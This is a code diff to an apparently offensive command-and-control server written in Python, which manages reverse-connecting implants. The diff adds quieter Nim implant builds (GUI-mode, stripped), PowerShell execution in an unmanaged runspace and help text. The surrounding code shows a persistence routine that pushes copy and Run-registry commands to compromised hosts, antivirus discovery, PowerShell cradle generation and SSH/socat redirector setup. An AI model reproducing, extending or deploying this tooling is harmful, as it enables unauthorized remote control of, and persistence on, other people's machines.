@@ -16,8 +16,8 @@ import randomname
 from Cryptodome.PublicKey import RSA
 import re
 import atexit
-
-
+from rich import print
+from rich.progress import track
 
 def banner():
     print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
@@ -38,7 +38,7 @@ def help():
     sessions -i <sessions_val>  --> Enter a callback session
     use <sessions_val>          --> Enter a callback session
     pwsh_cradle                 --> Generate a pwsh cradle for a payload on the payloads server
-    kill <sessions_val>         --> Kils active callback
+    kill <sessions_val>         --> Terminate active callback
     exit                        --> exit from the server
 
     Session Commands
@@ -46,6 +46,7 @@ def help():
     background                  --> Backgrounds current sessions
     exit                        --> Terminate current session
     GetAV                       --> Get the current AV running
+    pwsh <COMMAND>              --> Load CLR and run powershell in unmanged runspace 
     ''')
 
 
@@ -54,7 +55,7 @@ def listener_handler(): # Function to handle incoming connections and send bytes
         sock.bind((host_ip, int(host_port)))
     except (OSError):
         print(f'[-] Adress already in use, please try another one')
-    if listen_choice == 3:
+    if listen_choice == "3":
         print(f'[*] Awaiting callback from implants on {re_ip_str}:{host_port} ')
     else:
         print(f'[*] Awaiting callback from implants on {host_ip}:{host_port}')
@@ -76,8 +77,6 @@ def comm_in(target_id):
 
 def comm_out(target_id, message):
     message = str(message + '\n')
-    #message = base64.b64encode(bytes(message, encoding='utf-8'))
-    #target_id.send(message)
     target_id.send(message.encode())
     
     
@@ -86,7 +85,6 @@ def comm_out(target_id, message):
 
 def kill_signal(target_id, message):
     message = str(message)
-    #message = base64.b64encode(bytes(message, encoding='utf-8'))
     target_id.send(message.encode())
 
 def target_comm(target_id, targets, num):
@@ -100,25 +98,23 @@ def target_comm(target_id, targets, num):
         else:
             comm_out(target_id, message)
             if message == 'exit\n':
-                #message = base64.b64encode(message.encode())
                 target_id.send(message.encode())
                 target_id.close()
                 targets[num][7] = 'Dead'
                 break
             if message == 'background\n':
                 break
+
+            if message == 'help\n':
+                help()
            
             if message == 'persist\n':
                 payload_n = input('[*] Enter the name of the payload to add to persist: ')
                 if targets[num] [6] == 1:
                     ran_name = randomname.get_name()
                     persist1 = f'copy {payload_n} C:\\Users\\Public'
-                    #persist1 = base64.b64encode(persist1.encode())
-                    #target_id.send(persist1.encode())
                     comm_out(target_id, persist1) 
                     persist2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v {ran_name} /t REG_SZ /d C:\\Users\Public\\{payload_n}'
-                    #persist2 = base64.b64encode(persist2.encode())
-                    #target_id.send(persist2.encode())
                     comm_out(target_id, persist2)
                     print(f'[*] Run the following command to cleanup the registry key: \nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v {ran_name} /f')
                     print('[+] The persistance technique has completed')
@@ -234,6 +230,8 @@ def linplant():
         print(f'[+] {f_name} saved to {implant_loc}')
 
 def nimplant():
+    global host_ip
+    global host_port
     random_name = randomname.get_name()
     compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
     f_name= f'{compile_name}.nim'
@@ -249,7 +247,7 @@ def nimplant():
     print('[*] 1. Listener adress')
     print('[*] 2. Other IP')
     imp_choice = input('[*] Enter 1 or 2: ')
-    if imp_choice == 1:
+    if imp_choice == "1":
         pass
     else:
         host_ip = input('[*] Specify IP: ')
@@ -263,10 +261,10 @@ def nimplant():
     with open(f'{implant_loc}/{f_name}', 'w') as f:
         f.write(patch_port)
         f.close()
-    compile_cmd = [f"nim", "c", "-d:mingw", "--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
-    print(f'[*] Compiling executeable {exe_file}...')
-    process = subprocess.Popen(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    process.wait()
+    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release", "--app:gui", "-d:strip", "--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
+    for _ in track(range(8), description=f'[green][*] Compiling executeable {exe_file}...'):
+        process = subprocess.Popen(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        process.wait()
     implant_loc = os.path.join(implant_loc, exe_file)
     if os.path.exists(implant_loc):
         print(f'[+] {exe_file} saved to {implant_loc}')   
@@ -369,7 +367,7 @@ def redirector(LPORT):
         stderr=subprocess.PIPE,
         check=False)
     print('[+] Socat relay configured...')
-    print('[* Setting up reverse port forward on localhost]')
+    print('[*] Setting up reverse port forward on localhost]')
     os.system(f"ssh -N -R 4567:localhost:{host_port} root@{re_ip_str} &")
 
    
@@ -379,14 +377,19 @@ def exit_handler():
     os.chdir(terra_loc)
     os.system("terraform destroy -auto-approve")
 
-    print('[*] Cleaning up files....')
-    os.remove("redirector.tf")
+    try:
+        print('[*] Cleaning up files...')
+        os.remove("redirector.tf")
+    except:
+        print('[-] File not found.')
 
 if __name__ == '__main__':
     targets = [] #store each socket connection
     listener_count = 0
     banner()
     kill_flag = 0
+    global host_ip
+    global host_port
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     if not os.path.exists('Generated_Implants'):
@@ -412,25 +415,21 @@ if __name__ == '__main__':
                     while True:
                         try:
                             host_ip = resolve_ip(input('[*] Enter the interface to listen on: '))
-                            
                             host_port = int(input('[*] Enter listening port: '))
                             break  # exit the loop if no exception was raised
                         except (OSError, ValueError, TypeError):
                             print('[-] No such Interface or port... Please try again')
                 elif listen_choice == 2:
+                    
                     while True:
                         try:
                             host_ip = input('[*] Enter the IP to listen on: ')
-                                
                             host_port = int(input('[*] Enter listening port: '))
                             break  # exit the loop if no exception was raised
                         except (OSError, ValueError, TypeError):
                             print('[-] No such IP or port... Please try again')
                 elif listen_choice == '3':
-
-                    
                     host_ip = resolve_ip("lo")
-                    
                     host_port = int(input('[*] Enter listening port: '))
                     redirector(host_port)
                 
@@ -489,7 +488,7 @@ if __name__ == '__main__':
                             if (targets[num])[7] == 'Active':
                                 target_comm(target_id, targets, num)
                             else: 
-                                print(['[-] Can not interact with Dead implant'])
+                                print('[-] Can not interact with Dead implant')
                         except IndexError:
                             try:
                                 print(f'[-] Session {num} does not exist')
@@ -504,9 +503,10 @@ if __name__ == '__main__':
                     if (targets[num])[7] == 'Active':
                         target_comm(target_id, targets, num)
                     else: 
-                        print(['[-] Can not interact with Dead implant'])
-                except IndexError:
-                    print[f'[-] Session {num} does not exist' ]
+                        print('[-] Can not interact with Dead implant')
+                except (IndexError, TypeError):
+                    print(f'[-] Session {num } does not exist' )
+                    
             if command == 'exit':
                 quit_message = input('Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
                 if quit_message == 'y':
